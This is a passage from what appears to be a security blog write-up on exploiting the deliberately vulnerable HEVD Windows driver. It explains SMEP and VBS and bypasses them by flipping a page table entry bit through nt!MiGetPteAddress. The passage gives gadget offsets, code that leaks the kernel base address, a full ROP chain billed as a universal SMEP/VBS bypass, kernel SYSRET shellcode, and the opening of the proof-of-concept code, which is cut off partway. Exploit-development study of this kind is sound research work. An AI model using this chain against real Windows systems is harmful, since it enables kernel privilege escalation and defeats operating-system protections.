</code></pre><p>So basically we have to place this value into CR4 to turn off SMEP&hellip; While researching this I came across a blog post by <a href="https://fluidattacks.com/blog/hevd-smep-bypass/" target="_blank">fluidattacks</a> and noticed he used a ROP gadget in the <code>nt</code> module, specifically <code>KeFlushCurrentTb</code>. We can get our current running version using WinDbg via <code>vertarget</code>. When ran on our target, this was the currently installed Windows version:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/vertarget.png" alt="alt text" />
      
    </figure>
</p>
<p>That said, this gadget would not be available to us. If we check for other similar functions we find a similar gadget within <code>nt!KeFlushCurrentTbImmediatley</code> with the main difference being <code>RCX</code> being used to modify CR4 instead of <code>EAX</code>:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/KeFlush.png" alt="alt text" />
      
    </figure>
</p>
<p>Since addresses are randomized, we need to calculate the offset of that ROP gadget from the start of the <code>nt</code> module:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/rva.png" alt="alt text" />
      
    </figure>
</p>
<p>Here we see the offset is <code>0x000000000039dc27</code>.</p>


<h3 class="relative group">Finding &amp; Using ROP Gadgets 
    <div id="finding--using-rop-gadgets" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#finding--using-rop-gadgets" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Now we need to find a <code>pop rcx; ret</code> gadget to place the new <code>CR4</code> value into <code>RCX</code>. We can find one using <a href="https://github.com/0vercl0k/rp" target="_blank">rp++</a>, which has quickly become my favorite ROP gadget tool. Here we search for gadgets within <code>ntoskrnl.exe</code> since this is the primary kernel file for the Windows OS. To do this you can use the following syntax:</p>
<pre tabindex="0"><code>rp-win.exe --rop=50 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
</code></pre><p>We can then parse the results using powershell.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/pwoershell.png" alt="alt text" />
      
    </figure>
</p>
<p>Using these offsets we can confirm we have a working gadget in WinDbg.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/confirm.png" alt="alt text" />
      
    </figure>
</p>
<p>However, we still have to deal with the randomization of the <code>nt</code> module itself&hellip;</p>


<h3 class="relative group">Finding the Kernel Base Address 
    <div id="finding-the-kernel-base-address" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#finding-the-kernel-base-address" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>If you peeked into my brain during this period of learning, you would have observed unadulterated fear. Since under a user-mode exploit you would normally now require a read primitive to get the base address of a loaded module. However, with a little bit of research you&rsquo;ll find there are multiple methods to obtain the base address of <code>nt</code> (or any other loaded module for that matter) from medium integrity (default user configuration).</p>
<p>I ended up using a known method of leveraging <code>EnumDeviceDrivers</code> to obtain the base address.</p>
<p>The code I used can be seen below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">GetKernelBaseAddress</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="o">*</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwBytesNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span> <span class="o">*</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to allocate heap for lpImageBase</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] EnumDeviceDrivers: %d&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">             <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span> <span class="o">*</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Base Address: %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pKernelBaseAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pKernelBaseAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>With that we should have everything needed to get code execution! Right? Wrong :(</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/error.png" alt="alt text" />
      
    </figure>
</p>
<p>When putting everything together, we get the error above (ignore the different gadget location I tried changing it at this point because I could not fathom this not working).</p>
<p>What happened? Well&hellip; it looks like we encountered a new memory protection that I have not heard of. We&rsquo;ve run into <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf" target="_blank">Virtualization-Based Security (VBS)</a>, which means any <a href="https://www.microsoft.com/en-us/security/blog/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/#:~:text=Unauthorized%20modifications,instantly." target="_blank">&ldquo;unauthorized modifications of the CR4 control register bitfields, including the SMEP field, are blocked instantly&rdquo;</a>.</p>


<h2 class="relative group">Bypassing VBS (Theory) 
    <div id="bypassing-vbs-theory" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#bypassing-vbs-theory" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Having conducted a bit of research into how others have approached this, the idea here is to flip a bit within a Page Table Entry (PTE) respective to the memory location of our usermode shellcode.</p>
<p>If we recall when we tried to execute the shellcode directly we got the following error:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/error_pte.png" alt="alt text" />
      
    </figure>
</p>
<p>Basically, the way SMEP is enforced is on a per memory basis, via the U/S PTE control bit. Let&rsquo;s look at the output of <code>!pte</code> in WinDbg in regards to the user mode shellcode allocation to try to understand the page table entry permissions.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/pte_output.png" alt="alt text" />
      
    </figure>
</p>
<p>So what would happen if we were to clear the user mode bit (U)? If flipped, this page in thoery becomes a Kernel mode page. The bit location of U can be seen below.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/pte_bits.png" alt="alt text" />
      
    </figure>
</p>
<p>Let&rsquo;s set a breakpoint at <code>HEVD+0x866b9</code> and reboot to test this. Once our breakpoint is hit, we can modify the PTE as shown below. Once execution is continued you can see we successfully get code execution as we overwrite RAX with 0xDEADBEEF (psuedo shellcode).</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/flip_bit.png" alt="alt text" />
      
    </figure>
</p>
<p>Sweet, we have a solid bypass route for SMEP and VBS but how can we do this dynamically&hellip;</p>


<h1 class="relative group">Violet Phosphorus 
    <div id="violet-phosphorus" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#violet-phosphorus" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>With our analysis complete I decided to put my theory into practice and created <code>Violet Phosphorus</code> a universal and generic SMEP/VBS bypass. Can we call this the successor of the <a href="https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/" target="_blank">White Phosphorus Exploit Pack</a>? Or would that be too much&hellip; you can find the ROP chain below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="cm">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x3f99ce</span><span class="p">;</span> <span class="c1">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000008</span><span class="p">;</span> <span class="c1">// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span class="line"><span class="cl"><span class="cm">     userland code. The setup is as follows:
</span></span></span><span class="line"><span class="cl"><span class="cm">  
</span></span></span><span class="line"><span class="cl"><span class="cm">       RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span class="line"><span class="cl"><span class="cm">         ( RCX == PTE / Userland Code )
</span></span></span><span class="line"><span class="cl"><span class="cm">       );
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xa74d93</span><span class="p">;</span> <span class="c1">// pop rcx ; ret     [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>     <span class="c1">// *shellcode        [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x26b560</span><span class="p">;</span> <span class="c1">// MiGetPteAddress() [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span class="line"><span class="cl"><span class="cm">     mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x2ffbfb</span><span class="p">;</span> <span class="c1">// sub rax, rdx ; ret                [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xa6f2f5</span><span class="p">;</span> <span class="c1">// push rax ; pop rbx ; ret          [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x3f99ce</span><span class="p">;</span> <span class="c1">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000004</span><span class="p">;</span> <span class="c1">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x2107b2</span><span class="p">;</span> <span class="c1">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span></code></pre></div>

<h2 class="relative group">Understanding the ROP Chain 
    <div id="understanding-the-rop-chain" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-the-rop-chain" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Let&rsquo;s be honest there exists other ways to bypass VBS/SMEP but from what I&rsquo;ve seen most require a leak. Why suffer when Microsoft gives us a function to get this information dynamically? Below is the ASM code within WinDbg of the <em>MiGetPteAddress()</em> function.</p>
<pre tabindex="0"><code>0: kd&gt; u nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff800`4d67f770 48c1e909                shr     rcx,9
fffff800`4d67f774 48b8f8ffffff7f000000    mov rax,7FFFFFFFF8h
fffff800`4d67f77e 4823c8                  and     rcx,rax
fffff800`4d67f781 48b80000000080f0ffff    mov rax,0FFFFF08000000000h
fffff800`4d67f78b 4803c1                  add     rax,rcx
fffff800`4d67f78e c3                      ret
</code></pre><p>From what I&rsquo;ve seen in the &ldquo;wild&rdquo;, people normally use this function to get the base address of all PTE&rsquo;s. Let&rsquo;s take a step back and ask ourselves what does this function actually do when called? We don&rsquo;t even need Ghidra for this to be honest. Let&rsquo;s write the C equivalent to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* wetw0rk */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int64_t</span> <span class="nf">MiGetPteAddress</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">rcx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">rax</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">rcx</span> <span class="o">=</span> <span class="n">rcx</span> <span class="o">&gt;&gt;</span> <span class="mi">9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rax</span> <span class="o">=</span> <span class="mh">0x7FFFFFFFF8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rcx</span> <span class="o">=</span> <span class="n">rcx</span> <span class="o">&amp;</span> <span class="n">rax</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rax</span> <span class="o">=</span> <span class="mh">0x0FFFFF08000000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rax</span> <span class="o">=</span> <span class="n">rax</span> <span class="o">+</span> <span class="n">rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rax</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;PTE Located @{ 0x%llx }</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">MiGetPteAddress</span><span class="p">(</span><span class="mh">0x00000220c16d0000</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If we compile this we see it gives us the the address of the PTE.</p>
<pre tabindex="0"><code>┌──(wetw0rk㉿kali)-[~]
└─$ gcc MiGetPteAddress.c -o meme
                                                                                                                                                                                                                                             
┌──(wetw0rk㉿kali)-[~]
└─$ ./meme 
PTE Located @{ 0xfffff0811060b680 }
</code></pre><p>This means we can leverage this existing function to manipulate the PTE directly. After all, we are running under the context of the Kernel so we can call Bill Gates if we want to. To summarize all we need to do is pass this function the address of our shellcode and in return this function will return the PTE respective to our allocation. How nice :)</p>
<p>Once we have the address of the PTE, we simply dereference it and flip the <code>U</code> bit to a <code>K</code> bit. What insane mathematical operation must we do to accomplish such a task?</p>
<p>That&rsquo;s right - XOR!</p>
<pre tabindex="0"><code>&gt;&gt;&gt; &#34;0x&#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16)
&#39;0x0000000226d83863&#39;
</code></pre><p>You know what this means right?</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/captain.gif" alt="alt text" />
      
    </figure>
</p>


<h1 class="relative group">Crafting a PoC 
    <div id="crafting-a-poc" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#crafting-a-poc" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>At this point we have everything we need to get code execution&hellip; except returning to Userland. Normally it&rsquo;s best to restore execution flow manually. However, I decided to instead use <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html" target="_blank">Kristal-G&rsquo;s SYSRET</a> shellcode - a technique that allows for a generic return from the Kernel. From my understanding this is the first of its kind (other than the <a href="https://github.com/vnik5287/sock_diag_x64/blob/486ce10dbef95776b22f228a74afe39ec9a0e16c/sockdiag_smep.c#L59" target="_blank">Linux variant</a>). You can generate Kristal-G&rsquo;s shellcode using <a href="https://github.com/wetw0rk/Sickle" target="_blank">Sickle</a> as shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>wetw0rk㉿kali<span class="o">)</span>-<span class="o">[</span>/opt/Sickle/src<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00&#34;</span> // movabs rax, qword ptr gs:<span class="o">[</span>0x188<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x66\x8b\x88\xe4\x01\x00\x00&#34;</span>                 // mov cx, word ptr <span class="o">[</span>rax + 0x1e4<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x66\xff\xc1&#34;</span>                                 // inc cx
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x66\x89\x88\xe4\x01\x00\x00&#34;</span>                 // mov word ptr <span class="o">[</span>rax + 0x1e4<span class="o">]</span>, cx
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x48\x8b\x90\x90\x00\x00\x00&#34;</span>                 // mov rdx, qword ptr <span class="o">[</span>rax + 0x90<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x48\x8b\x8a\x68\x01\x00\x00&#34;</span>                 // mov rcx, qword ptr <span class="o">[</span>rdx + 0x168<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x4c\x8b\x9a\x78\x01\x00\x00&#34;</span>                 // mov r11, qword ptr <span class="o">[</span>rdx + 0x178<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x48\x8b\xa2\x80\x01\x00\x00&#34;</span>                 // mov rsp, qword ptr <span class="o">[</span>rdx + 0x180<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x48\x8b\xaa\x58\x01\x00\x00&#34;</span>                 // mov rbp, qword ptr <span class="o">[</span>rdx + 0x158<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x31\xc0&#34;</span>                                     // xor eax, eax
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x0f\x01\xf8&#34;</span>                                 // swapgs 
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x48\x0f\x07&#34;</span>                                 // sysretq
</span></span></code></pre></div><p>Below is the PoC code, however offsets may be different on your build of Windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// I/O Request Packets (IRPs)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BUFFER_SIZE 4242
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">GetKernelBaseAddress</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="o">*</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwBytesNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span> <span class="o">*</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to allocate heap for lpImageBase</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
